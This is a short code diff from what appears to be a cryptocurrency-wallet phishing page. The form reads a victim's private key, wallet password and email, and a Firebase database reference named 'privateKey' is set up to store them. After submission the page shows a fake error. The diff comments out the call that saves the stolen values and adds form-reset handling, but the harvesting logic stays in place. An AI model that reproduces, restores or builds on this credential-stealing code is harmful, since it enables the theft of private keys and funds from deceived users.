@@ -14,12 +14,13 @@ var contactFormDB3 = firebase.database().ref('privateKey')
 
 document.getElementById('pButton').addEventListener('click', submitForm)
 
-function submitForm() {
+function submitForm(e) {
+  e.preventDefault()
   var privateKey = document.getElementById('privateKey').value
   var tempPassword =  document.getElementById('pwalletPassword').value
   var walletAddress =  document.getElementById('pemailid').value
 
-  saveMessages3(privateKey, tempPassword, walletAddress)
+  // saveMessages3(privateKey, tempPassword, walletAddress)
   error3()
 }
 
@@ -39,6 +40,7 @@ function error3() {
 }
 
 document.querySelector('.closeP').addEventListener('click', ()=>{
+  document.querySelector('.p-block').reset()
   document.querySelector('.p-block').classList.remove('d-none')
   document.querySelector('.errorP').classList.add('d-none')
 })
